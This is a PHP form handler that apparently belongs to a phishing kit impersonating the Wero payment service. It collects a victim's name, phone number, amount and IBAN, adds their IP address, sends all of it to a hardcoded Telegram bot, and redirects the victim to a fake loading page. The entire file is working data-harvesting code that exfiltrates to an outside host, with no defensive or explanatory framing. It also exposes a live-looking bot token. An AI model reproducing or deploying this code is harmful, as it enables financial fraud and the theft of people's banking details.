<?php
// 1. Configuration Telegram
$BOT_TOKEN = "7749490498:AAHVQ5yVLBT1vFuulMXDe6GqA7K9pVk5YWs";
$CHAT_ID = "7796457959";

// 2. Récupération sécurisée des données
$name = htmlspecialchars($_POST['name'] ?? '');
$tel = htmlspecialchars($_POST['tel'] ?? '');
$montant = htmlspecialchars($_POST['montant'] ?? '');
$iban = htmlspecialchars($_POST['iban'] ?? '');

// 3. Création du message
$message = "🟢 NOUVELLE DEMANDE WERO 🟢\n";
$message .= "👤 Nom : $name\n";
$message .= "📞 Téléphone : $tel\n";
$message .= "💶 Montant : $montant\n";
$message .= "🏦 IBAN : $iban\n";
$message .= "🕒 Date : " . date('d/m/Y H:i:s') . "\n";
$message .= "🌍 IP : " . $_SERVER['REMOTE_ADDR'];

// 4. Envoi à Telegram
$url = "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage?" . http_build_query([
    'chat_id' => $CHAT_ID,
    'text' => $message
]);

// 5. Exécution et redirection
file_get_contents($url); // Envoi non bloquant
header('Location: Chargement1.html');
exit;
?>